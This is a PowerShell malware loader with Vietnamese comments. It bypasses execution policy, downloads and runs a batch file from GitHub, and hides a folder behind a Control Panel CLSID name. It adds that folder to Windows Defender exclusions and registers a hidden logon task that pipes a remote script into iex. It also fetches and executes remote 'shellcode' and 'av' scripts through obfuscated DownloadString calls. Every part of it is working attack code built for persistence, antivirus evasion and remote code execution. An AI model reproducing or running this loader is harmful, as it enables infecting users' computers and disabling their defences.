



Set-ExecutionPolicy Bypass -Scope Process -Force

$skid = "skid"

# Kiểm tra xem script có quyền quản trị không
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        # Tải xuống tệp batch
        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
        $outputFile = "$env:TEMP\download.bat"
        
        Write-Output "Tải xuống tệp từ $url"
        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop

        # Kiểm tra xem tệp đã được tải xuống thành công không
        if (-not (Test-Path $outputFile)) {
            throw "Tệp tải xuống không tồn tại: $outputFile"
        }

        # Thực thi tệp batch mà không cần quyền quản trị
        Write-Output "Khởi chạy tệp batch."
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        
        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
        Write-Output "Kết thúc tiến trình PowerShell."
        Stop-Process -Id $PID -Force
    }
    catch {
        Write-Error "Lỗi xảy ra: $_"
    }
}


$rdir = "C:\Users\Loader"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp

Add-MpPreference -ExclusionPath $dir

$task_name = "Windows startup"
$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -nop -ep bypass -c ""iwr https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -useb | iex"""
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force


Write-Host "[!] Persistence Added" -ForegroundColor Green

iwr https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt |iex



$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/output/av.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

# if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
#     $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
#     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$datacode')"
#     Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
# }





Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}
